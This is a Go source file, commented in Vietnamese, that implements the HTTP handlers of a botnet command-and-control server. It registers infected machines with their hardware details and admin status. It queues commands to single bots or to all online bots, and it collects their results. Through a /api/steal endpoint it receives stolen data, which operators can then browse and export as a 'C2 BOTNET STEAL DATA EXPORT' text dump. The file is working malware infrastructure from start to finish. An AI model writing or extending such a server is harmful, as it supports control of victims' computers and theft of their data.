/**
 * handlers.go
 * Xu ly cac API request cho C2 server
 * Bao gom: register, checkin, result, steal, login, bots, commands, stats
 * Moi nhat: them HandleDeleteBot, HandleExportSteals, HandleCleanupBots
 */

package main

import (
    "database/sql"
    "encoding/hex"
    "encoding/json"
    "log"
    "net/http"
    "strings"
    "sync"
    "time"

    "github.com/gin-gonic/gin"
)

/**
 * Rate limiter don gian su dung map
 */
type RateLimiter struct {
    mu       sync.Mutex
    requests map[string][]time.Time
}

var limiter = &RateLimiter{
    requests: make(map[string][]time.Time),
}

/**
 * Kiem tra rate limit cho IP
 */
func (rl *RateLimiter) IsAllowed(ip string) bool {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    now := time.Now()
    windowStart := now.Add(-1 * time.Minute)

    /* Loc cac request trong 1 phut qua */
    var recent []time.Time
    for _, t := range rl.requests[ip] {
        if t.After(windowStart) {
            recent = append(recent, t)
        }
    }

    rl.requests[ip] = recent

    if len(recent) >= AppConfig.RateLimitMax {
        return false
    }

    rl.requests[ip] = append(rl.requests[ip], now)
    return true
}

/**
 * Don dep rate limiter moi 5 phut
 */
func (rl *RateLimiter) Cleanup() {
    rl.mu.Lock()
    defer rl.mu.Unlock()

    now := time.Now()
    windowStart := now.Add(-5 * time.Minute)

    for ip, times := range rl.requests {
        var recent []time.Time
        for _, t := range times {
            if t.After(windowStart) {
                recent = append(recent, t)
            }
        }
        if len(recent) == 0 {
            delete(rl.requests, ip)
        } else {
            rl.requests[ip] = recent
        }
    }
}

/**
 * Middleware CORS cho tat ca request
 */
func CORSMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Access-Control-Allow-Origin", "*")
        c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Authorization, X-Bot-ID, X-Encryption-Key")
        c.Header("Access-Control-Max-Age", "86400")

        if c.Request.Method == "OPTIONS" {
            c.AbortWithStatus(http.StatusNoContent)
            return
        }

        c.Next()
    }
}

/**
 * Middleware JWT xac thuc cho admin endpoints
 */
func JWTAuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        authHeader := c.GetHeader("Authorization")
        if authHeader == "" {
            c.JSON(http.StatusUnauthorized, APIResponse{
                Success: false,
                Message: "Thieu header Authorization",
            })
            c.Abort()
            return
        }

        /* Tach "Bearer " tu header */
        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        if tokenString == authHeader {
            c.JSON(http.StatusUnauthorized, APIResponse{
                Success: false,
                Message: "Header Authorization khong hop le",
            })
            c.Abort()
            return
        }

        claims, err := ValidateJWT(tokenString)
        if err != nil {
            c.JSON(http.StatusUnauthorized, APIResponse{
                Success: false,
                Message: "Token khong hop le hoac da het han",
            })
            c.Abort()
            return
        }

        c.Set("username", (*claims)["username"])
        c.Next()
    }
}

/**
 * Middleware rate limiting
 */
func RateLimitMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        ip := c.ClientIP()
        if !limiter.IsAllowed(ip) {
            c.JSON(http.StatusTooManyRequests, APIResponse{
                Success: false,
                Message: "Qua nhieu request. Vui long thu lai sau.",
            })
            c.Abort()
            return
        }
        c.Next()
    }
}

/**
 * POST /api/register - Bot dang ky
 */
func HandleRegister(c *gin.Context) {
    var req RegisterRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Du lieu dang ky khong hop le",
        })
        return
    }

    botID := GenerateUUID()
    ip := c.ClientIP()
    now := time.Now()

    bot := &Bot{
        ID:        botID,
        Hostname:  req.Hostname,
        OS:        req.OS,
        IP:        ip,
        Country:   "Unknown", /* Co the them GeoIP sau */
        FirstSeen: now,
        LastSeen:  now,
        Status:    "online",
        CPU:       req.CPU,
        RAM:       req.RAM,
        GPU:       req.GPU,
        Disk:      req.Disk,
        LocalIP:   req.LocalIP,
        Arch:      req.Arch,
        Admin:     req.Admin,
    }

    err := AddBot(bot)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi luu bot vao database: " + err.Error(),
        })
        return
    }

    /* Tao encryption key rieng cho bot nay */
    botEncryptionKey := make([]byte, 32)
    for i := 0; i < 32; i++ {
        botEncryptionKey[i] = byte(time.Now().UnixNano()>>(i%8)) ^ byte(i*7)
    }
    /* Ma hoa key mac dinh cua server de gui cho bot */
    serverKeyBytes, _ := hex.DecodeString(AppConfig.EncryptionKey)
    /* Su dung key mac dinh de ma hoa bot encryption key */
    encryptedBotKey, _ := EncryptAESGCM(botEncryptionKey, serverKeyBytes)

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Dang ky thanh cong",
        Data: gin.H{
            "bot_id":         botID,
            "encryption_key": encryptedBotKey,
        },
    })

    log.Printf("[REGISTER] Bot moi: %s - %s (%s)", botID, req.Hostname, req.OS)
}

/**
 * POST /api/checkin - Bot goi heartbeat, nhan lenh dang cho
 */
func HandleCheckin(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")
    if botID == "" {
        /* Thu lay bot_id tu body */
        var body map[string]interface{}
        if err := c.ShouldBindJSON(&body); err == nil {
            if bid, ok := body["bot_id"].(string); ok {
                botID = bid
            }
        }
    }
    if botID == "" {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Thieu Bot ID",
        })
        return
    }

    ip := c.ClientIP()
    err := UpdateBotCheckin(botID, ip)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi cap nhat checkin: " + err.Error(),
        })
        return
    }

    /* Lay lenh dang cho cho bot nay */
    commands, err := GetCommands(botID, "pending", 10)
    if err != nil {
        c.JSON(http.StatusOK, APIResponse{
            Success: true,
            Data:    gin.H{"commands": []Command{}},
        })
        return
    }

    /* Danh dau cac lenh la "executing" */
    for _, cmd := range commands {
        UpdateCommandResult(cmd.ID, "executing", "")
    }

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    gin.H{"commands": commands},
    })
}

/**
 * POST /api/result - Bot gui ket qua thuc thi lenh
 */
func HandleResult(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")

    var result map[string]interface{}
    if err := c.ShouldBindJSON(&result); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Du lieu ket qua khong hop le",
        })
        return
    }

    cmdID, _ := result["command_id"].(string)
    status, _ := result["status"].(string)
    resStr, _ := result["result"].(string)

    if cmdID == "" {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Thieu command_id",
        })
        return
    }

    err := UpdateCommandResult(cmdID, status, resStr)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi cap nhat ket qua: " + err.Error(),
        })
        return
    }

    /* Broadcast ket qua den admin qua WebSocket */
    BroadcastToAdmins(WSMessage{
        Type:      "command_result",
        BotID:     botID,
        CommandID: cmdID,
        Result:    resStr,
        Timestamp: time.Now().Unix(),
    })

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Da nhan ket qua",
    })
}

/**
 * POST /api/steal - Bot gui du lieu da steal
 */
func HandleSteal(c *gin.Context) {
    botID := c.GetHeader("X-Bot-ID")
    if botID == "" {
        /* Thu lay bot_id tu body */
        var body map[string]interface{}
        if err := c.ShouldBindJSON(&body); err == nil {
            if bid, ok := body["bot_id"].(string); ok {
                botID = bid
            }
        }
    }

    var stealReq struct {
        DataType string `json:"data_type"`
        Data     string `json:"data"`
    }

    if err := c.ShouldBindJSON(&stealReq); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Du lieu steal khong hop le",
        })
        return
    }

    err := SaveStealData(botID, stealReq.DataType, stealReq.Data)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi luu du lieu steal: " + err.Error(),
        })
        return
    }

    /* Broadcast den admin */
    BroadcastToAdmins(WSMessage{
        Type:      "new_steal",
        BotID:     botID,
        Module:    stealReq.DataType,
        Timestamp: time.Now().Unix(),
    })

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Da nhan du lieu steal",
    })
}

/**
 * POST /api/login - Admin dang nhap
 */
func HandleLogin(c *gin.Context) {
    var req LoginRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Du lieu dang nhap khong hop le",
        })
        return
    }

    user, err := GetUserByUsername(req.Username)
    if err != nil {
        c.JSON(http.StatusUnauthorized, APIResponse{
            Success: false,
            Message: "Sai username hoac mat khau",
        })
        return
    }

    if !CheckPassword(req.Password, user.PasswordHash) {
        c.JSON(http.StatusUnauthorized, APIResponse{
            Success: false,
            Message: "Sai username hoac mat khau",
        })
        return
    }

    /* Tao JWT token */
    token, err := CreateJWT(req.Username)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi tao token: " + err.Error(),
        })
        return
    }

    /* Cap nhat token trong database */
    UpdateUserToken(req.Username, token)

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Dang nhap thanh cong",
        Data:    gin.H{"token": token},
    })
}

/**
 * GET /api/bots - Lay danh sach bot
 */
func HandleGetBots(c *gin.Context) {
    status := c.Query("status")
    country := c.Query("country")
    search := c.Query("search")
    limit := 200
    offset := 0

    bots, err := GetBots(status, country, search, limit, offset)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi lay danh sach bot: " + err.Error(),
        })
        return
    }

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    gin.H{"bots": bots, "count": len(bots)},
    })
}

/**
 * GET /api/bots/:id - Chi tiet 1 bot
 */
func HandleGetBotDetail(c *gin.Context) {
    botID := c.Param("id")

    bot, err := GetBotByID(botID)
    if err != nil {
        c.JSON(http.StatusNotFound, APIResponse{
            Success: false,
            Message: "Khong tim thay bot",
        })
        return
    }

    /* Lay lich su lenh cua bot */
    commands, _ := GetCommands(botID, "", 50)

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    gin.H{"bot": bot, "recent_commands": commands},
    })
}

/**
 * POST /api/command - Gui lenh den bot
 */
func HandleSendCommand(c *gin.Context) {
    var req CommandRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, APIResponse{
            Success: false,
            Message: "Du lieu lenh khong hop le",
        })
        return
    }

    /* Neu gui den tat ca bot online */
    if req.BotID == "all" || req.BotID == "*" {
        onlineBots, err := GetBots("online", "", "", 0, 0)
        if err != nil {
            c.JSON(http.StatusInternalServerError, APIResponse{
                Success: false,
                Message: "Loi lay danh sach bot online: " + err.Error(),
            })
            return
        }

        var commandIDs []string
        for _, bot := range onlineBots {
            cmd := &Command{
                ID:        GenerateUUID(),
                BotID:     bot.ID,
                Module:    req.Module,
                Action:    req.Action,
                Params:    req.Params,
                Status:    "pending",
                CreatedAt: time.Now(),
                UpdatedAt: time.Now(),
            }

            err := AddCommand(cmd)
            if err != nil {
                continue
            }
            commandIDs = append(commandIDs, cmd.ID)
        }

        c.JSON(http.StatusOK, APIResponse{
            Success: true,
            Message: "Da gui lenh den tat ca bot online",
            Data:    gin.H{"command_ids": commandIDs, "bot_count": len(onlineBots)},
        })
        return
    }

    /* Gui den 1 bot cu the */
    cmd := &Command{
        ID:        GenerateUUID(),
        BotID:     req.BotID,
        Module:    req.Module,
        Action:    req.Action,
        Params:    req.Params,
        Status:    "pending",
        CreatedAt: time.Now(),
        UpdatedAt: time.Now(),
    }

    err := AddCommand(cmd)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi tao lenh: " + err.Error(),
        })
        return
    }

    /* Broadcast lenh moi qua WebSocket cho bot */
    BroadcastCommandToBot(cmd)

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Da gui lenh den bot " + req.BotID,
        Data:    gin.H{"command_id": cmd.ID},
    })
}

/**
 * GET /api/commands - Xem lich su lenh
 */
func HandleGetCommands(c *gin.Context) {
    botID := c.Query("bot_id")
    status := c.Query("status")

    commands, err := GetCommands(botID, status, 200)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi lay lich su lenh: " + err.Error(),
        })
        return
    }

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    gin.H{"commands": commands, "count": len(commands)},
    })
}

/**
 * GET /api/steals - Xem du lieu steal
 */
func HandleGetSteals(c *gin.Context) {
    botID := c.Query("bot_id")
    dataType := c.Query("data_type")

    steals, err := GetStealData(botID, dataType, 200)
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi lay du lieu steal: " + err.Error(),
        })
        return
    }

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    gin.H{"steals": steals, "count": len(steals)},
    })
}

/**
 * GET /api/stats - Thong ke tong quan
 */
func HandleGetStats(c *gin.Context) {
    stats, err := GetStats()
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi lay thong ke: " + err.Error(),
        })
        return
    }

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Data:    stats,
    })
}

/**
 * Health check endpoint
 */
func HandleHealthCheck(c *gin.Context) {
    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "C2 Server dang hoat dong",
        Data: gin.H{
            "timestamp": time.Now().Unix(),
            "version":   "1.0.0",
        },
    })
}

/**
 * DELETE /api/bots/:id - Xoa bot
 */
func HandleDeleteBot(c *gin.Context) {
    botID := c.Param("id")

    /* Xoa bot va cac du lieu lien quan */
    DB.Exec("DELETE FROM bots WHERE id = ?", botID)
    DB.Exec("DELETE FROM commands WHERE bot_id = ?", botID)
    DB.Exec("DELETE FROM steal_data WHERE bot_id = ?", botID)

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Bot da xoa thanh cong",
    })
}

/**
 * GET /api/export - Xuat du lieu steal ra file text
 */
func HandleExportSteals(c *gin.Context) {
    dataType := c.Query("data_type")

    var rows *sql.Rows
    var err error

    if dataType != "" {
        rows, err = DB.Query("SELECT bot_id, data_type, data, timestamp FROM steal_data WHERE data_type = ? ORDER BY timestamp DESC LIMIT 500", dataType)
    } else {
        rows, err = DB.Query("SELECT bot_id, data_type, data, timestamp FROM steal_data ORDER BY timestamp DESC LIMIT 500")
    }
    if err != nil {
        c.JSON(http.StatusInternalServerError, APIResponse{
            Success: false,
            Message: "Loi truy van database",
        })
        return
    }
    defer rows.Close()

    var output strings.Builder
    output.WriteString("=== C2 BOTNET STEAL DATA EXPORT ===\n")
    output.WriteString("=== Thoi gian xuat: " + time.Now().Format("2006-01-02 15:04:05") + " ===\n\n")

    for rows.Next() {
        var botID, dataType, data, timestamp string
        rows.Scan(&botID, &dataType, &data, &timestamp)

        output.WriteString("--- " + strings.ToUpper(dataType) + " ---\n")
        output.WriteString("Bot ID: " + botID + "\n")
        output.WriteString("Thoi gian: " + timestamp + "\n")
        output.WriteString("Du lieu:\n")

        /* Thu format JSON cho dep */
        var prettyJSON map[string]interface{}
        if json.Unmarshal([]byte(data), &prettyJSON) == nil {
            formatted, _ := json.MarshalIndent(prettyJSON, "", "  ")
            output.WriteString(string(formatted))
        } else {
            output.WriteString(data)
        }
        output.WriteString("\n\n")
        output.WriteString("----------------------------------------\n\n")
    }

    /* Tra ve file text */
    c.Header("Content-Type", "text/plain; charset=utf-8")
    c.Header("Content-Disposition", "attachment; filename=steal_data_"+time.Now().Format("20060102_150405")+".txt")
    c.String(http.StatusOK, output.String())
}

/**
 * POST /api/cleanup - Xoa toan bo du lieu (reset database)
 */
func HandleCleanupBots(c *gin.Context) {
    DB.Exec("DELETE FROM commands")
    DB.Exec("DELETE FROM steal_data")
    DB.Exec("DELETE FROM bots")

    c.JSON(http.StatusOK, APIResponse{
        Success: true,
        Message: "Da xoa toan bo du lieu (reset database)",
    })
}
